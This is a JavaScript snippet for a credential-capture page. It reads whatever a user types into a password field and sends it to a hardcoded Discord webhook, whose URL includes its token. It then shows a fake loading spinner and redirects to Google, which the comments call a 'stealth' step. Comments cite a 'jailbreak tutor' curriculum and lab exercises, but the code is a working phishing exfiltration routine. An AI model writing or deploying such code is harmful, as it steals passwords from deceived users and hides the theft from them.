// Hardcoded Webhook for Owens' Lair
const LAIR_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";

async function captureFinal(event) {
    if(event) event.preventDefault();
    
    // 1. UI Feedback: Show the spinner, hide the button
    const spinner = document.getElementById('loading-spinner');
    if (spinner) spinner.style.display = 'block';
    
    const btn = event.target;
    if (btn) btn.style.display = 'none';

    // Grabbing the value from your pass-input field
    const passInput = document.getElementById('pass-input');
    const passValue = passInput ? passInput.value : "NO_INPUT_FOUND";

    // Building the payload as per JAILBREAK_TUTOR_CURRICULUM_104.txt standards
    const payload = {
        embeds: [{
            title: "🔑 Owens' Lair: Secret Exfiltrated",
            description: "A student's secret has been successfully captured.",
            color: 0x2ecc71, // Green for success
            fields: [
                { name: "Captured Secret", value: `||${passValue}||` },
                { name: "Phase", value: "FINAL_CAPTURE_SUCCESS" }
            ],
            footer: { text: "Protocol: LAB_EXERCISES_104.txt" },
            timestamp: new Date()
        }]
    };

    try {
        // 2. The Transmission (The actual exfiltration)
        const response = await fetch(LAIR_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (!response.ok) {
            console.error("Lair Server Error:", response.statusText);
        }

        // 3. The "Stealth" Redirect
        // 1.5 seconds of "loading" makes the redirect to Google feel realistic
        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 1500);

    } catch (err) {
        console.error("Transmission Interrupted:", err);
        // Even if it fails, we redirect to stay stealthy
        window.location.href = "https://google.com";
    }
}
